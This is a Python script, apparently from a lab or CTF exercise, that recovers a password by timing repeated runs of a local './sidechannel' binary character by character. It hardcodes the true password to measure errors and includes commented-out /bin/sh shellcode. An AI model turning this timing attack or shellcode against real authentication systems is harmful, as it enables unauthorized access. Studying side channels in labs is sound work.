#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import string
import time

rpasswd = 'S1deCh4nnelAttack3r'  # 正确的密码
#shellcode = "\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x0b\\x58\\x99\\x52\\x68//sh\\x68/bin\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80"
shellcode = '123'
password = []    # 定义密码变量
orgpasswd = []
passwordDict = {}
errnum = 0
reset = 50
numletter = string.ascii_letters+string.digits  # 密码范围
print(numletter)
for k in range(19):   # 限定密码长度
    time.sleep(1)  # 必要的
    timelist = []
    for c in numletter:  # 遍历密码范围
        password.append(c)
        avgtime = 0      # 定义并将统计时间变量置为0
        command = './sidechannel ' + \
            ''.join(password)+' '+shellcode  # 拼接要运行的命令
        for i in range(reset):  # 重复次数
            start = time.time_ns()  # 使用time_ns函数计时
            os.system(command)  # 运行命令
            end = time.time_ns()
            avgtime += end - start  # 记录平均时间
        passwordDict[c] = avgtime  # 写入字典
        timelist.append(avgtime)  # 添加至列表，之后比较
        password.pop()
    # 将字典按照元素值进行逆序排序
    passwordDict = dict(sorted(passwordDict.items(), key=lambda i: i[1]))

    password.append(list(passwordDict.keys())[0])
    orgpasswd.append(password[k])

    if password[k] != rpasswd[k]:  # 判断密码是否正确，不正确打印相关信息
        print(f"Error {password[k]}，Success is {rpasswd[k]}")
        print(
            f"{password[k]}:{timelist[numletter.index(password[k])]}  --  {rpasswd[k]}:{timelist[numletter.index(rpasswd[k])]}修正")
        print(f"备选方案：{list(passwordDict.items())[0:5]}")
        password[k] = rpasswd[k]
        errnum += 1
    print(''.join(password))
print(
    f"修正密码：{''.join(password)}\n直算密码：{''.join(orgpasswd)}\n循环次数: {reset}，错误位数: {errnum}/{len(password)}")  # 打印已经判断出的密码
